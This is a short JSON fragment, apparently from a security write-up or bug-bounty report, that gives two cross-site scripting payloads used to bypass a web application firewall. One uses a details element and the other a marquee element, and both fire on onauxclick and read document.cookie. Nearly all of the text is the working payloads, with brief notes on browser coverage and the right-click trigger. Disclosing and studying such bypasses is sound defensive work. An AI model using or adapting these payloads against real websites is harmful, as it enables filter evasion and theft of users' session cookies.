      "category": "team",
      "content": "The following payloads were used to bypass the WAF and perform XSS:\n\nBasic payload but did not work on all browsers:\n\n```html\n\"><details onauxclick=x=prompt,x`${document.cookie}`></details>\n```\n\nPayload worked on all browsers, but needed a right-click to be executed:\n\n```html\n\"><marquee+width=1000+onauxclick=confirm(document.cookie)>XSS</marquee>\n```",
